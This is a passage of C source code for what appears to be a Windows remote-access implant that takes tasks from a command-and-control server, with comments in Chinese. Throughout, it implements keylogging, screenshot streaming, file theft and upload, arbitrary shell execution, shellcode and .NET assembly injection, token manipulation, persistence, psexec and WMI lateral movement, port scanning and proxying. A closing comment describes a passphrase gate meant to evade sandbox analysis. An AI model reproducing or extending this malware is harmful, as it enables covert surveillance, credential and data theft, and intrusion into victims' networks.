                line[n++] = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 'd' : '-';
                line[n++] = '\t';
                {
                    unsigned int v = sz;
                    char t[16];
                    int m = 0;
                    if (v == 0) t[m++] = '0';
                    while (v) { t[m++] = (char)('0' + (v % 10)); v /= 10; }
                    while (m > 0 && n < 520) line[n++] = t[--m];
                }
                line[n++] = '\t';
                for (k = 0; fd.cFileName[k] && n < 530; k++) line[n++] = fd.cFileName[k];
                line[n++] = '\r';
                line[n++] = '\n';

                if (total + n > cap) break;
                bmemcpy(out + total, line, n);
                total += n;
            } while (FindNextFileA(h, &fd));
            FindClose(h);
            (void)i;
        }
        break;

    case 0x04:   /* rm */
        if (DeleteFileA(arg)) {
            const char *m = "[+] 已删除\r\n";
            unsigned int L = bstrlen(m);
            bmemcpy(out, m, L); total = L;
        } else {
            const char *m = "[-] 删除失败\r\n";
            unsigned int L = bstrlen(m);
            bmemcpy(out, m, L); total = L;
        }
        break;

    case 0x05:   /* mkdir */
        if (CreateDirectoryA(arg, NULL)) {
            const char *m = "[+] 已创建\r\n";
            unsigned int L = bstrlen(m);
            bmemcpy(out, m, L); total = L;
        } else {
            const char *m = "[-] 创建失败\r\n";
            unsigned int L = bstrlen(m);
            bmemcpy(out, m, L); total = L;
        }
        break;

    case 0x06:   /* cat */
        {
            HANDLE h;
            DWORD got = 0;
            h = CreateFileA(arg, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (h == INVALID_HANDLE_VALUE) {
                const char *e = "[-] 无法打开文件\r\n";
                unsigned int L = bstrlen(e);
                bmemcpy(out, e, L); total = L;
            } else {
                ReadFile(h, out, cap, &got, NULL);
                total = got;
                CloseHandle(h);
            }
        }
        break;

    default:
        {
            const char *e = "[-] 未知文件操作\r\n";
            unsigned int L = bstrlen(e);
            bmemcpy(out, e, L); total = L;
        }
        break;
    }
    return total;
}

/* 启动下载: 记录状态, 首块随本次循环发出 */
static void start_download(const cs_task *t)
{
    HANDLE h;
    DWORD hi = 0;

    if (!box_space(64)) { box_result(t->id, ST_ERR, (const unsigned char *)"outbox full", 11); return; }

    {
        unsigned int L = t->arglen < sizeof(g_dl_path) - 1 ? t->arglen : sizeof(g_dl_path) - 1;
        bmemcpy(g_dl_path, t->arg, L);
        g_dl_path[L] = 0;
    }

    h = CreateFileA(g_dl_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        box_result(t->id, ST_ERR, (const unsigned char *)"[-] 无法打开文件\r\n", 20);
        return;
    }
    hi = GetFileSize(h, NULL);
    CloseHandle(h);

    g_dl_active = 1;
    g_dl_job    = t->id;
    g_dl_off    = 0;
    g_dl_total  = hi;

    {
        char note[300];
        unsigned int n = 0;
        const char *p = "[+] 开始下载 ";
        unsigned int L, k;
        for (k = 0; p[k] && n < sizeof(note) - 1; k++) note[n++] = p[k];
        L = bstrlen(g_dl_path);
        for (k = 0; k < L && n < sizeof(note) - 1; k++) note[n++] = g_dl_path[k];
        note[n++] = '\r'; note[n++] = '\n';
        box_result(t->id, ST_PARTIAL, (const unsigned char *)note, n);
    }
}

/* 启动内存缓冲传输 (截屏等): 数据所有权移交, 传输完成后释放 */
static void start_download_mem(unsigned int job, unsigned char *data, unsigned int len,
                               const char *name)
{
    if (g_dl_active || !data || len == 0) {
        if (data) VirtualFree(data, 0, MEM_RELEASE);
        box_result_str(job, ST_ERR, "[-] 传输忙或数据为空\r\n");
        return;
    }
    g_dl_active = 1;
    g_dl_mem    = data;
    g_dl_job    = job;
    g_dl_off    = 0;
    g_dl_total  = len;
    bstrcpy_n(g_dl_path, name, sizeof(g_dl_path));

    {
        char note[300];
        unsigned int n = 0, k;
        const char *p = "[+] 开始回传 ";
        for (k = 0; p[k] && n < sizeof(note) - 1; k++) note[n++] = p[k];
        for (k = 0; g_dl_path[k] && n < sizeof(note) - 1; k++) note[n++] = g_dl_path[k];
        note[n++] = '\r'; note[n++] = '\n';
        box_result(job, ST_PARTIAL, (const unsigned char *)note, n);
    }
}

/* 推进下载: 每次最多发送与 outbox 剩余空间匹配的块 */
static void pump_download(void)
{
    HANDLE h;
    unsigned int room, want;
    unsigned char *buf;
    int mem_mode;

    if (!g_dl_active) return;

    /* 每块 TLV 开销 = 4 + 12 */
    if (!box_space(C2_CHUNK + 32u)) return;

    mem_mode = (g_dl_mem != NULL);

    h = NULL;
    if (!mem_mode) {
        h = CreateFileA(g_dl_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h == INVALID_HANDLE_VALUE) {
            g_dl_active = 0;
            box_result(g_dl_job, ST_ERR, (const unsigned char *)"[-] 读取失败\r\n", 16);
            return;
        }
        SetFilePointer(h, (LONG)g_dl_off, NULL, FILE_BEGIN);
    }

    room = MAX_PLAIN - g_outlen - 32u;
    want = C2_CHUNK;
    if (want > room) want = room;

    {
        unsigned int start = box_begin(T_FILE_CHUNK, 12u + want);
        DWORD got = 0;
        if (start == BOX_FAIL) {
            if (h) CloseHandle(h);
            return;
        }
        buf = g_out + g_outlen;

        cs_put_be32(buf, g_dl_job);
        cs_put_be32(buf + 4, g_dl_off);
        cs_put_be32(buf + 8, g_dl_total);

        if (mem_mode) {
            unsigned int left = g_dl_total - g_dl_off;
            got = (left < want) ? left : want;
            if (got) bmemcpy(buf + 12, g_dl_mem + g_dl_off, got);
        } else {
            if (!ReadFile(h, buf + 12, want, &got, NULL)) got = 0;
        }

        box_end(start, 12u + got);
        g_dl_off += got;

        if (got == 0 || g_dl_off >= g_dl_total) {
            unsigned int job = g_dl_job;
            g_dl_active = 0;
            if (g_dl_mem) { VirtualFree(g_dl_mem, 0, MEM_RELEASE); g_dl_mem = NULL; }
            box_result(job, ST_OK, (const unsigned char *)"[+] 传输完成\r\n", 20);
        }
    }
    if (h) CloseHandle(h);
}

/* 截图流的 sink: 把最新一帧交给传输层。
 * 返回非 0 = 让 shotstream 丢弃这一帧 (传输忙时"最新帧优先", 不排队)。 */
static int shot_sink(unsigned int job, unsigned char *data, unsigned int len)
{
    char name[64];
    unsigned int k = 0, i, v = GetCurrentProcessId();
    char t[16];
    int m = 0;
    const char *pfx = "stream_";

    if (g_dl_active) return 1;          /* 上一帧还没传完: 丢掉这一帧 */
    if (!data || len == 0) return 1;

    for (i = 0; pfx[i] && k < sizeof(name) - 16; i++) name[k++] = pfx[i];
    if (v == 0) t[m++] = '0';
    while (v) { t[m++] = (char)('0' + (v % 10)); v /= 10; }
    while (m > 0 && k < sizeof(name) - 8) name[k++] = t[--m];
    name[k++] = '.';
    name[k++] = 'j';
    name[k++] = 'p';
    name[k++] = 'g';
    name[k] = 0;

    start_download_mem(job, data, len, name);
    return 0;
}

/* 周期取走键盘记录增量 */
static void pump_keylog(void)
{
    unsigned char *kb = NULL;
    unsigned int kl = ops_keylog_peek(&kb);

    if (kl == 0 || !kb) return;

    {
        unsigned int start = box_begin(T_KEYLOG, kl);
        if (start == BOX_FAIL) return;
        bmemcpy(g_out + g_outlen, kb, kl);
        box_end(start, kl);
        ops_keylog_drain(NULL, 0);   /* 标记已发送 */
    }
}

/* 上传块: arg = [2B path_len][path][4B total][4B offset][bytes] */
static void do_upload(const cs_task *t)
{
    unsigned short plen;
    const unsigned char *p = t->arg;
    char path[400];
    unsigned int total, offset, datalen;
    HANDLE h;
    DWORD written = 0;
    int first;

    if (t->arglen < 10u) { box_result_str(t->id, ST_ERR, "[-] 上传参数错误\r\n"); return; }

    plen = cs_be16(p);
    if (plen == 0 || plen > sizeof(path) - 1 || 2u + plen + 8u > t->arglen) {
        box_result_str(t->id, ST_ERR, "[-] 上传参数错误\r\n");
        return;
    }
    bmemcpy(path, p + 2, plen);
    path[plen] = 0;

    total    = cs_be32(p + 2 + plen);
    offset   = cs_be32(p + 2 + plen + 4);
    datalen  = t->arglen - (2u + plen + 8u);
    first    = (offset == 0);

    h = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                    first ? CREATE_ALWAYS : OPEN_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        box_result_str(t->id, ST_ERR, "[-] 无法写入文件\r\n");
        return;
    }

    SetFilePointer(h, (LONG)offset, NULL, FILE_BEGIN);
    if (datalen) WriteFile(h, p + 2 + plen + 8, datalen, &written, NULL);
    CloseHandle(h);

    if (offset + datalen >= total) {
        char note[300];
        unsigned int n = 0, k;
        const char *q = "[+] 上传完成 ";
        for (k = 0; q[k] && n < sizeof(note) - 1; k++) note[n++] = q[k];
        for (k = 0; path[k] && n < sizeof(note) - 1; k++) note[n++] = path[k];
        note[n++] = '\r'; note[n++] = '\n';
        box_result(t->id, ST_OK, (const unsigned char *)note, n);
    } else {
        box_result_str(t->id, ST_PARTIAL, "");
    }
}

/* ------------------------------------------------------------ 任务分发 */

static unsigned char *g_scratch;    /* 命令输出暂存 */

static void run_task(const cs_task *t, unsigned char *scratch);

/* 暂存一个传输类任务 (参数必须复制: t->arg 指向会被下一批覆盖的下行缓冲) */
static void pend_push(const cs_task *t)
{
    pend_task *p;

    if (g_pend_n >= PEND_MAX) {
        box_result_str(t->id, ST_BUSY, "[-] 传输忙, 任务队列已满\r\n");
        return;
    }
    p = &g_pend[g_pend_n++];
    p->id  = t->id;
    p->cls = t->cls;
    bstrcpy_n(p->alias, t->alias, sizeof(p->alias));
    p->arglen = t->arglen < PEND_ARG_MAX ? t->arglen : PEND_ARG_MAX;
    if (p->arglen) bmemcpy(p->arg, t->arg, p->arglen);

    /* 明确告知进入排队, 否则操作员只会看到"命令无响应" */
    box_result_str(t->id, ST_BUSY, "[*] 当前有传输进行中, 任务已排队\r\n");
}

static void pend_run(void)
{
    int i = 0;

    while (i < g_pend_n && !g_dl_active) {
        cs_task t;
        int k;

        t.id     = g_pend[i].id;
        t.cls    = g_pend[i].cls;
        bstrcpy_n(t.alias, g_pend[i].alias, sizeof(t.alias));
        t.arg    = g_pend[i].arg;
        t.arglen = g_pend[i].arglen;

        /* 先移出队列再执行, 避免 run_task 内的忙检查把它又推回来 */
        for (k = i; k + 1 < g_pend_n; k++) g_pend[k] = g_pend[k + 1];
        g_pend_n--;

        run_task(&t, g_scratch);
    }
}

static void run_task(const cs_task *t, unsigned char *scratch)
{
    unsigned int n = 0;

    /* 传输忙: 延迟传输类任务, 避免打断正在进行的传输 */
    if (g_dl_active &&
        (t->cls == CMD_FILE_DL || t->cls == CMD_SCREENSHOT)) {
        pend_push(t);
        return;
    }

    switch (t->cls) {

    case CMD_EXEC_SHELL:
        {
            char *cmd = (char *)scratch;
            unsigned char *tmp = scratch + 4096;
            unsigned int L = t->arglen < 4000u ? t->arglen : 4000u;
            bmemcpy(cmd, t->arg, L);
            cmd[L] = 0;
            n = cmd_shell(cmd, tmp, 400000u);
            box_result(t->id, ST_OK, tmp, n);
        }
        break;

    case CMD_SCREENSHOT:
        {
            /* arg = [1B mode][4B interval_ms]  (mode 0=单次 1=启动流 2=停止流) */
            unsigned char smode = (t->arglen > 0) ? (unsigned char)t->arg[0] : 0;
            unsigned int  sinterval = (t->arglen >= 5u) ? cs_be32(t->arg + 1) : 5000u;

            if (smode == 1) {
                if (shotstream_start(sinterval, shot_sink)) {
                    char note[96];
                    unsigned int k = 0;
                    const char *p = "[+] 截图流已启动, 间隔约 ";
                    while (p[k] && k < sizeof(note) - 20) { note[k] = p[k]; k++; }
                    {
                        char tmp[16];
                        int m = 0;
                        unsigned int v = sinterval / 1000u;
                        if (v == 0) tmp[m++] = '0';
                        while (v) { tmp[m++] = (char)('0' + (v % 10)); v /= 10; }
                        while (m > 0 && k < sizeof(note) - 8) note[k++] = tmp[--m];
                    }
                    note[k++] = 's';
                    note[k++] = '\r'; note[k++] = '\n'; note[k] = 0;
                    box_result(t->id, ST_OK, (const unsigned char *)note, k);
                } else {
                    box_result_str(t->id, ST_ERR,
                        "[-] 截图流启动失败 (已在运行, 或 GDI+ 不可用)\r\n");
                }
                break;
            }
            if (smode == 2) {
                shotstream_stop();
                box_result_str(t->id, ST_OK, "[+] 截图流已停止\r\n");
                break;
            }

            /* 优先走 JPEG: 一张 1536x960 的 24 位 BMP 是 4.4 MB, 分块回传要 9 轮
             * beacon, 连续截图根本不可行; GDI+ 的 JPEG 通常压到 1/20。
             * GDI+ 不可用时回退 BMP —— 功能优先于体积。 */
            unsigned int cap = 32u * 1024u * 1024u;
            unsigned char *bmp = (unsigned char *)VirtualAlloc(NULL, cap,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!bmp) { box_result_str(t->id, ST_ERR, "[-] 内存不足\r\n"); break; }

            n = shot_jpeg(bmp, cap);
            if (n > 0) {
                char name[80];
                unsigned int k = 0, v;
                char tmpn[16];
                int m = 0;
                const char *pfx = "screen_";
                for (k = 0; pfx[k]; k++) name[k] = pfx[k];
                v = GetCurrentProcessId();
                if (v == 0) tmpn[m++] = '0';
                while (v) { tmpn[m++] = (char)('0' + (v % 10)); v /= 10; }
                while (m > 0) name[k++] = tmpn[--m];
                name[k++] = '.';
                name[k++] = 'j';
                name[k++] = 'p';
                name[k++] = 'g';
                name[k] = 0;
                start_download_mem(t->id, bmp, n, name);
                break;
            }

            /* GDI+ 路径失败: 回退 BMP */
            n = ops_screenshot(bmp, cap);
            if (n == 0) {
                VirtualFree(bmp, 0, MEM_RELEASE);
                {
                    char msg[160];
                    unsigned int m2 = 0;
                    const char *p = "[-] 截屏失败 (JPEG: ";
                    while (p[m2] && m2 < sizeof(msg) - 40) { msg[m2] = p[m2]; m2++; }
                    p = shot_last_error();
                    while (p && *p && m2 < sizeof(msg) - 8) { msg[m2++] = *p++; }
                    msg[m2++] = ')';
                    msg[m2++] = '\r'; msg[m2++] = '\n'; msg[m2] = 0;
                    box_result(t->id, ST_ERR, (const unsigned char *)msg, m2);
                }
            } else {
                char name[80];
                unsigned int k = 0, v;
                char tmpn[16];
                int m = 0;
                const char *pfx = "screen_";
                for (k = 0; pfx[k]; k++) name[k] = pfx[k];
                v = GetCurrentProcessId();
                if (v == 0) tmpn[m++] = '0';
                while (v) { tmpn[m++] = (char)('0' + (v % 10)); v /= 10; }
                while (m > 0) name[k++] = tmpn[--m];
                name[k++] = '.';
                name[k++] = 'b';
                name[k++] = 'm';
                name[k++] = 'p';
                name[k] = 0;
                start_download_mem(t->id, bmp, n, name);
            }
        }
        break;

    case CMD_KEYLOG:
        {
            unsigned char *tmp = scratch + 4096;
            int start = (t->arglen > 0 && t->arg[0]) ? 1 : 0;
            if (start) {
                n = ops_keylog(1, tmp, 400000u);
                box_result(t->id, ST_OK, tmp, n);
            } else {
                /* 停止: 把尚未回传的捕获内容作为键盘记录 TLV 补发 */
                unsigned int kl = ops_keylog(0, tmp, 400000u);
                (void)kl;
                {
                    unsigned char *kb = NULL;
                    unsigned int got = ops_keylog_peek(&kb);
                    if (got > 0) {
                        unsigned int s2 = box_begin(T_KEYLOG, got);
                        if (s2 != BOX_FAIL) {
                            bmemcpy(g_out + g_outlen, kb, got);
                            box_end(s2, got);
                            ops_keylog_drain(NULL, 0);
                        }
                    }
                }
                box_result_str(t->id, ST_OK, "[+] 键盘记录已停止\r\n");
            }
        }
        break;

    case CMD_TOKEN:
        {
            unsigned char *tmp = scratch + 4096;
            char sub[32], argb[220];
            unsigned int i = 0, j = 0;
            while (i < t->arglen && t->arg[i] != ' ' && i < sizeof(sub) - 1) {
                sub[i] = (char)t->arg[i]; i++;
            }
            sub[i] = 0;
            if (i < t->arglen && t->arg[i] == ' ') {
                i++;
                while (i < t->arglen && j < sizeof(argb) - 1) { argb[j++] = (char)t->arg[i++]; }
            }
            argb[j] = 0;
            n = ops_token(sub, argb, tmp, 400000u);
            box_result(t->id, ST_OK, tmp, n);
        }
        break;

    case CMD_INJ_PROC:
        {
            unsigned char *tmp = scratch + 4096;
            if (t->arglen < 5u) {
                box_result_str(t->id, ST_ERR, "[-] 用法: inject <pid> <base64 shellcode>\r\n");
            } else {
                unsigned int pid = cs_be32(t->arg);
                n = ops_inject(pid, t->arg + 4, t->arglen - 4u, tmp, 400000u);
                box_result(t->id, ST_OK, tmp, n);
            }
        }
        break;

    case CMD_INJ_BOF:
        {
            /* arg = [4B cofflen][4B arglen][coff][参数块]
             * 参数块是大端 [4B 长度][数据] 序列 (与 CS 一致, 见 go 侧 bofPack) */
            unsigned char *tmp = scratch + 4096;
            unsigned int cofflen, barglen, outlen = 0;
            int rc;

            if (t->arglen < 8u) {
                box_result_str(t->id, ST_ERR, "[-] BOF 参数过短\r\n");
                break;
            }
            cofflen = cs_be32(t->arg);
            barglen = cs_be32(t->arg + 4);
            if (cofflen == 0 || 8u + cofflen + barglen > t->arglen) {
                box_result_str(t->id, ST_ERR, "[-] BOF 长度字段非法\r\n");
                break;
            }

            rc = bof_execute(t->arg + 8, cofflen, t->arg + 8 + cofflen, barglen,
                             (char *)tmp, 400000u, &outlen);
            if (rc != 0) {
                char msg[128];
                unsigned int k = 0;
                const char *p = "[-] BOF 执行失败 rc=";
                while (p[k] && k < sizeof(msg) - 6) { msg[k] = p[k]; k++; }
                msg[k++] = (char)('0' + (rc % 10));
                msg[k++] = '\r';
                msg[k++] = '\n';
                msg[k] = 0;
                box_result(t->id, ST_ERR, (const unsigned char *)msg, k);
            } else {
                box_result(t->id, ST_OK, tmp, outlen);
            }
        }
        break;

    case CMD_INJ_ASSEMBLY:
        {
            /* arg = [4B asmlen][4B argslen][4B stubblen][asm][args][stub]
             * 目标程序集全程走 base64 参数进内存; 只有通用引导 stub 落地。 */
            unsigned char *tmp = scratch + 4096;
            unsigned int asmlen, argslen, stubblen, b64len = 0;
            const unsigned char *asmB, *argsB, *stubB;
            char stubPath[340], outPath[340];
            char *argbuf;
            unsigned int abi = 0, k;
            int rc = 0, stubRet = 0;

            if (t->arglen < 12u) {
                box_result_str(t->id, ST_ERR, "[-] execute-assembly 参数过短\r\n");
                break;
            }
            asmlen   = cs_be32(t->arg);
            argslen  = cs_be32(t->arg + 4);
            stubblen = cs_be32(t->arg + 8);
            if (asmlen == 0 || stubblen == 0 ||
                12u + asmlen + argslen + stubblen > t->arglen) {
                box_result_str(t->id, ST_ERR, "[-] execute-assembly 长度字段非法\r\n");
                break;
            }
            asmB  = t->arg + 12;
            argsB = asmB + asmlen;
            stubB = argsB + argslen;

            if (!temp_path(stubPath, sizeof(stubPath), "dll") ||
                !write_all_file(stubPath, stubB, stubblen)) {
                box_result_str(t->id, ST_ERR, "[-] 无法写出引导 stub\r\n");
                break;
            }
            if (!temp_path(outPath, sizeof(outPath), "log")) {
                DeleteFileA(stubPath);
                box_result_str(t->id, ST_ERR, "[-] 无法生成输出路径\r\n");
                break;
            }
            DeleteFileA(outPath);

            /* base64(程序集) 放进 g_wxf_out 前半区, 完整参数放后半区。
             * 用工作线程私有缓冲: 本命令在异步线程里执行, 主循环的 c2_post
             * 也使用 g_xf_out 做 body 变换, 共用会互相踩。 */
            if (xform_one(XF_BASE64, 0, asmB, asmlen, g_wxf_out,
                          XF_BUF_SIZE / 2u, &b64len) != 0) {
                DeleteFileA(stubPath);
                box_result_str(t->id, ST_ERR,
                    "[-] 程序集过大或编码失败 (上限约 1.5 MB)\r\n");
                break;
            }
            g_wxf_out[b64len] = 0;
            argbuf = (char *)g_wxf_out + XF_BUF_SIZE / 2u;

#define CLR_PUSH(s) do {                                    \
                const char *p_ = (s);                       \
                unsigned int q_ = 0;                        \
                while (p_[q_] && abi < XF_BUF_SIZE / 2u - 2u) \
                    argbuf[abi++] = p_[q_++];               \
            } while (0)

            CLR_PUSH((const char *)g_wxf_out);
            CLR_PUSH("|");
            for (k = 0; k < argslen; k++) {
                char c = (char)argsB[k];
                if (c == '|') c = ' ';          /* 分隔符不能出现在参数里 */
                if (abi < XF_BUF_SIZE / 2u - 2u) argbuf[abi++] = c;
            }
            CLR_PUSH("|");
            CLR_PUSH(outPath);
            argbuf[abi] = 0;
#undef CLR_PUSH

            rc = clr_execute_in_dll(stubPath, "CsdevStub", "Run", argbuf, &stubRet);

            {
                unsigned int rlen = read_all_file(outPath, tmp, 400000u);
                if (rc != 0) {
                    char msg[160];
                    unsigned int m = 0;
                    const char *p = "[-] CLR 调用失败 rc=";
                    while (p[m] && m < sizeof(msg) - 8) { msg[m] = p[m]; m++; }
                    msg[m++] = (char)('0' + (rc % 10));
                    msg[m++] = '\r'; msg[m++] = '\n'; msg[m] = 0;
                    box_result(t->id, ST_ERR, (const unsigned char *)msg, m);
                } else if (rlen == 0) {
                    box_result_str(t->id, ST_OK,
                        "[*] 程序集执行完毕, 无输出 (入口可能没有写 Console)\r\n");
                } else {
                    box_result(t->id, ST_OK, tmp, rlen);
                }
            }

            DeleteFileA(stubPath);
            DeleteFileA(outPath);
        }
        break;

    case CMD_PERSIST:
        {
            unsigned char *tmp = scratch + 4096;
            int mode = (t->arglen > 0) ? (int)t->arg[0] : 0;
            char nm[80];
            unsigned int k = 0;
            if (t->arglen > 1) {
                unsigned int j = 1;
                while (j < t->arglen && k < sizeof(nm) - 1) nm[k++] = (char)t->arg[j++];
            }
            nm[k] = 0;
            n = ops_persist(mode, nm, tmp, 400000u);
            box_result(t->id, ST_OK, tmp, n);
        }
        break;

    case CMD_NET_OPS:
        {
            /* arg = "<op> <rest>"; op 目前支持:
             *   psexec <host> <cmd>   原生 SCM 实现 (不走 sc.exe)
             */
            unsigned char *tmp = scratch + 4096;
            char op[16];
            char rest2[420];
            unsigned int i = 0, j = 0;

            while (i < t->arglen && t->arg[i] != ' ' && i < sizeof(op) - 1) {
                op[i] = (char)t->arg[i];
                i++;
            }
            op[i] = 0;
            if (i < t->arglen && t->arg[i] == ' ') {
                i++;
                while (i < t->arglen && j < sizeof(rest2) - 1) rest2[j++] = (char)t->arg[i++];
            }
            rest2[j] = 0;

            if (op[0] == 'p' && op[1] == 's') {
                /* psexec: 第一个词是主机, 其余是命令 */
                char host[200];
                char cmdline[320];
                unsigned int a = 0, b = 0;
                while (rest2[a] && rest2[a] != ' ' && b < sizeof(host) - 1) host[b++] = rest2[a++];
                host[b] = 0;
                while (rest2[a] == ' ') a++;
                b = 0;
                while (rest2[a] && b < sizeof(cmdline) - 1) cmdline[b++] = rest2[a++];
                cmdline[b] = 0;

                n = ops_psexec(host, cmdline, tmp, 400000u);
                box_result(t->id, ST_OK, tmp, n);
            } else if (op[0] == 'w' && op[1] == 'm') {
                /* wmiexec [-u user] [-p pass] [-d domain] <host> <cmd>:
                 * native WMI / DCOM Win32_Process::Create (kits/beacon/wmi.c) */
                n = ops_wmiexec_cmdline(rest2, tmp, 400000u);
                box_result(t->id, ST_OK, tmp, n);
            } else {
                box_result_str(t->id, ST_ERR,
                    "[-] 未知 NET_OPS 子命令 (支持: psexec <host> <cmd>, "
                    "wmiexec <host> <cmd>)\r\n");
            }
        }
        break;

    case CMD_PORTSCAN:
        {
            unsigned char *tmp = scratch + 4096;
            char host[128], ports[128];
            unsigned int i = 0, j = 0;
            while (i < t->arglen && t->arg[i] != ' ' && i < sizeof(host) - 1) {
                host[i] = (char)t->arg[i]; i++;
            }
            host[i] = 0;
            if (i < t->arglen && t->arg[i] == ' ') {
                i++;
                while (i < t->arglen && j < sizeof(ports) - 1) { ports[j++] = (char)t->arg[i++]; }
            }
            ports[j] = 0;
            n = ops_portscan(host, ports, 1000, tmp, 400000u);
            box_result(t->id, ST_OK, tmp, n);
        }
        break;

    case CMD_PROC_LIST:
        {
            unsigned char *tmp = scratch + 4096;
            n = cmd_proc_list(tmp, 400000);
            box_result(t->id, ST_OK, tmp, n);
        }
        break;

    case CMD_PS_LIST:
        {
            unsigned char *tmp = scratch + 4096;
            n = cmd_ps_list(tmp, 400000);
            box_result(t->id, ST_OK, tmp, n);
        }
        break;

    case CMD_FS_OPS:
        {
            unsigned char *tmp = scratch + 4096;
            char op = (t->arglen > 0) ? (char)t->arg[0] : 0;
            char argbuf[400];
            unsigned int L = 0;
            if (t->arglen > 1) {
                L = t->arglen - 1;
                if (L > sizeof(argbuf) - 1) L = sizeof(argbuf) - 1;
                bmemcpy(argbuf, t->arg + 1, L);
            }
            argbuf[L] = 0;
            n = cmd_fs_ops(op, argbuf, g_meta + 200, 300, tmp, 400000);
            box_result(t->id, ST_OK, tmp, n);
        }
        break;

    case CMD_FILE_DL:
        start_download(t);
        break;

    case CMD_FILE_UP:
        do_upload(t);
        break;

    case CMD_SET_SLEEP:
        if (t->arglen >= 5u) {
            unsigned int ms = cs_be32(t->arg);
            unsigned char j = t->arg[4];
            g_sess_state.sleep_ms = ms;
            g_sess_state.jitter = j;
            {
                char note[64];
                unsigned int k, m = 0;
                const char *q = "[+] sleep 已更新\r\n";
                for (k = 0; q[k]; k++) note[m++] = q[k];
                box_result(t->id, ST_OK, (const unsigned char *)note, m);
            }
        }
        break;

    case CMD_EXIT:
        box_result_str(t->id, ST_OK, "[+] 会话结束\r\n");
        break;

    case CMD_PROXY:
        {
            unsigned char *tmp = scratch + 4096;
            n = proxy_task(t->arg, t->arglen, (char *)tmp, 400000u);
            if (n > 0) box_result(t->id, ST_OK, tmp, n);
        }
        break;

    case CMD_RPORTFWD:
        {
            unsigned char *tmp = scratch + 4096;
            n = rportfwd_task(t->arg, t->arglen, (char *)tmp, 400000u);
            box_result(t->id, ST_OK, tmp, n);
        }
        break;

    default:
        box_result_str(t->id, ST_ERR, "[-] 该命令类别尚未实现\r\n");
        break;
    }
}

/* ------------------------------------------------------------ 异步任务线程
 *
 * 把长阻塞命令 (shell / inject / BOF / execute-assembly / token / portscan)
 * 从心跳主循环剥离到独立工作线程, 主循环只做: 睡眠 -> 泵 -> 收发 -> 派发。
 * 这样一条 10 秒的 shell 命令不会让心跳停摆 (旧实现"一条一条堵死通信"的根因)。
 *
 * 并发安全边界:
 *   - outbox (g_out/g_outlen) 由单一 CRITICAL_SECTION g_cs 保护;
 *     box_begin 加锁、box_end 解锁, 任何一条 TLV 的"预留-写入-提交"都是原子的。
 *   - 工作线程有自己的暂存 g_wscratch / g_wxf_out, 不与主循环共用。
 *   - 任务参数在入队时 VirtualAlloc 复制, 脱离会被下一批覆盖的下行缓冲。
 *   - 涉及模块状态机的命令 (keylog/screenshot/proxy/download/rportfwd) 仍留在
 *     主循环同步执行 —— 它们的 pump 都跑在主循环上, 跨线程会破坏其内部状态。 */

static int task_is_async(unsigned char cls)
{
    return cls == CMD_EXEC_SHELL || cls == CMD_INJ_PROC || cls == CMD_INJ_BOF ||
           cls == CMD_INJ_ASSEMBLY || cls == CMD_TOKEN || cls == CMD_PORTSCAN;
}

static int taskq_push(const cs_task *t)
{
    unsigned char *copy = NULL;

    if (t->arglen > 0) {
        copy = (unsigned char *)VirtualAlloc(NULL, t->arglen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!copy) {
            box_result_str(t->id, ST_ERR, "[-] 内存不足, 任务未执行\r\n");
            return 0;
        }
        bmemcpy(copy, t->arg, t->arglen);
    }

    EnterCriticalSection(&g_cs);
    if (g_taskq_n < TASKQ_MAX) {
        qtask *q = &g_taskq[g_taskq_tail];
        q->id = t->id;
        q->cls = t->cls;
        bmemcpy(q->alias, t->alias, sizeof(q->alias));
        q->arglen = t->arglen;
        q->arg = copy;
        g_taskq_tail = (g_taskq_tail + 1) % TASKQ_MAX;
        g_taskq_n++;
        SetEvent(g_task_evt);
        LeaveCriticalSection(&g_cs);
        return 1;
    }
    LeaveCriticalSection(&g_cs);

    if (copy) VirtualFree(copy, 0, MEM_RELEASE);
    box_result_str(t->id, ST_BUSY, "[-] 任务队列已满\r\n");
    return 0;
}

static DWORD WINAPI worker_proc(LPVOID param)
{
    (void)param;

    for (;;) {
        qtask q;
        cs_task t;
        int have = 0;

        WaitForSingleObject(g_task_evt, INFINITE);

        EnterCriticalSection(&g_cs);
        if (g_taskq_n > 0) {
            q = g_taskq[g_taskq_head];
            g_taskq_head = (g_taskq_head + 1) % TASKQ_MAX;
            g_taskq_n--;
            have = 1;
        }
        if (g_taskq_n == 0) ResetEvent(g_task_evt);
        LeaveCriticalSection(&g_cs);

        if (!have) {
            if (g_exiting) break;
            continue;
        }

        t.id = q.id;
        t.cls = q.cls;
        bmemcpy(t.alias, q.alias, sizeof(t.alias));
        t.arg = q.arg;
        t.arglen = q.arglen;

        run_task(&t, g_wscratch);

        if (q.arg) VirtualFree(q.arg, 0, MEM_RELEASE);

        if (g_exiting) {
            EnterCriticalSection(&g_cs);
            have = (g_taskq_n == 0);
            LeaveCriticalSection(&g_cs);
            if (have) break;
        }
    }
    return 0;
}

/* ------------------------------------------------------------ 主循环 */

/* 把整条命令行拷进调用方缓冲(GUI 子系统下 WinMain 拿不到 argv, 只能问 kernel32)。
 * 无条件编译: 启用与否现在是运行期判定的 (见 beacon_run), 不再是编译期开关。 */
static void GetCommandLineA_into(char *dst, unsigned int cap)
{
    const char *p = GetCommandLineA();
    unsigned int i = 0;
    if (!dst || cap == 0) return;
    if (p) {
        while (p[i] && i + 1u < cap) {
            dst[i] = p[i];
            i++;
        }
    }
    dst[i] = '\0';
}

int beacon_run(void)
{
    unsigned int flen, rlen;
    unsigned int fail = 0;   /* 连续通信失败计数: 达到阈值即重连会话 */
    int plen;

    /* 启动口令门控: 命令行(或环境变量)里没有正确口令就安静退出。
     * 放在最前面 —— 早于任何内存分配、反调试、联网动作, 沙箱直接双击运行时
     * 只能看到一个"跑完就结束"的普通程序。
     *
     * 启用与否是**运行期**判定的: 看配置槽里有没有写入口令摘要。
